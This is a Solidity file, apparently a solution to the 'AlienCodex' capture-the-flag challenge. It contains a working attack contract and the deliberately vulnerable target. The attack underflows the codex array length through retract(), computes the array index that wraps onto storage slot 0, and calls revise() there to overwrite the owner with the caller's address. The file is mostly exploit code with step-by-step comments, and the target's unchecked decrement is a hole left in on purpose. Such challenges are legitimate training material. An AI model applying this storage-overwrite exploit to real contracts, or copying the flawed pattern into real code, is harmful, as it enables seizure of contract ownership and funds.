// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import "./Ownable.sol";

contract AlienCodexAttack {
    function attack(AlienCodex _aliencodex) public {
        _aliencodex.make_contact();
        _aliencodex.retract(); // underflow codex array length to 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
        
        // _aliencodex storage slot 0 is [ 0 padding, bool contact (1byte), address owner (20 bytes)]
        // _aliencodex storage slot 1 is how many elements codex has: now 2**256 - 1
        // but there are only 2**256 storage slots, so there must be a collision of codex[some index] and slot 0
        // codex array is stored in slot keccak256(bytes32(1)), 
        // codex[0] is at slot[keccak256(bytes32(1)) + 0
        // codex[1] is at slot[keccak256(bytes32(1)) + 1]
        // at index (2**256 - keccak256(bytes32(1)), i.e. its complement)there is going to be overflow to 0
        // so codex[2**256 - keccak256(bytes32(1))] is at slot 0!!
        // keccak256(bytes32(1)) is 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6
        // 2**256 - keccak256(bytes32(1)) is 0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a
        
        _aliencodex.revise(0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a, bytes32(uint256(address(tx.origin))));
    }
}

contract AlienCodex is Ownable {

  bool public contact;
  bytes32[] public codex;

  modifier contacted() {
    assert(contact);
    _;
  }
  
  function make_contact() public {
    contact = true;
  }

  function record(bytes32 _content) contacted public {
  	codex.push(_content);
  }

  function retract() contacted public {
    codex.length--;
  }

  function revise(uint i, bytes32 _content) contacted public {
    codex[i] = _content;
  }
}
